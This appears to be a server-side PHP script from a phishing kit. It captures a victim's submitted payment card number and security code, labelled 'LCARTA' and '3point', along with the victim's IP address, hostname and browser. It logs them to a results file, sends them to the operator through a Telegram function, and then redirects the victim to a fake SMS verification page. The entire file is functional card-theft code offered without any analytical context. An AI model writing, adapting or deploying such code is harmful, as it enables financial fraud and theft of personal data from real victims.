<?php
require_once '../ventro/zabiosobi.php';
$ip = getenv("REMOTE_ADDR");

$message .= "----2/2/CVCV/CV/CV/-----\n";
$message .= "LCARTA/     	 : ".$_POST['taw']."\n";
$message .= "3point/     	 : ".$_POST['staw']."\n";



$message .= "-------------- IP Infos ------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-----------BY-/EOGL---------------\n";
$message .= "-------------- SMS/DATE----------\n";
$message .= "---------LCA2/2/2/2 / 2/2/2/2/------------\n";

$fp = fopen('../alresult.txt', 'a');
fwrite($fp, $message);
fclose($fp);
telegram_send(urlencode($message));
header("Location:  ../ruenan/two/trois/sms_verif.html");?>